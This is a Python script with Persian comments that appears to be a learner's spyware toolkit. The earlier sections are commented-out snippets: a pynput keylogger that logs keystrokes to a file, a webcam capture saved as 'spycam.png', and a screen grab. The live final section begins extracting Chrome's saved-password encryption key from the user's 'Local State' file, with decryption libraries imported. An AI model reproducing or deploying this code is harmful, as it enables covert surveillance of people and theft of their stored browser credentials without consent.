''''
from pynput.keyboard import Listener
from datetime import datetime, timedelta

special = {
    "<96>": 0,
    "<97>": 1,
    "<98>": 2,
    "<99>": 3,
    "<100>": 4,
    "<101>": 5,
    "<102>": 6,
    "<103>": 7,
    "<104>": 8,
    "<105>": 9
}


def on_press(key):
    listen = str(key).replace("'", '').replace('Key.', '')  # output keycode conver to str
    if listen in special:
        s = listen.replace(listen, str(special[listen]))
        with open('klg.txt', 'a') as f:
            f.write(s)
    else:
        with open('klg.txt', 'a') as f:
            f.write(listen)

start = datetime.now()
end = start + timedelta(seconds=10)

def on_release(key):
    if datetime.now() >= end:
        return False

# def on_release(key):
#     if str(key).replace("'", '').replace('Key.', '') == 'esc':
#         return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
'''

# ------------------------------------وب کم---------------------------------
'''
import cv2

camera = cv2.VideoCapture(0)    # شاخص دستگاه دوربین رو مشخص می کنه
ret, frame = camera.read()   # True , False       ,,,,,,     Frame       تاپل برمی گردونه اولی برا ی اینکه خونده شده یانه ودومی هم فریمی یا عکسی که خونده شد اس
if ret:
    cv2.imwrite('spycam.png', frame)  # فریمی که گرقته شده و برای ذخیره کردن عکس

camera.release()    # برای اینکه دوربین از کار بیفته یا بی خیال دوربین بشه
cv2.destroyAllWindows()     # برای اینکه پنجره ای باز نمونه

'''
# ---------------------------------------استکرین شات----------------------------------

'''
import pyautogui

save_screanshot = pyautogui.screenshot()
save_screanshot.save('screanshot.png')

'''

#------------------------------------پسورد کروم--------------------------

import os       #مسیریابی
import json     # نوعی فایل
import base64   # encreapt , descreapt  رمزگشایی و رمزنگاری
import sqlite3  # برای پایگاه داده
import shutil   # برای کپی کردن فایل ها
import win32crypt  # ---->>> pypiwin32
from Cryptodome.Cipher import AES  # یکی از الگوریتم های رمزنگاری  # ------>>> pycryptodomex


# C:\Users\lenovo\AppData\Local\Google\Chrome\User Data\Local State      برای بدست آوردن کلید

file_path = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data\Local State"

with open(file_path,'r', encoding='utf-8')as f:
    js_da = f.read()
    py_da = json.loads(js_da)

print(py_da['os_crypt']['encrypted_key'])

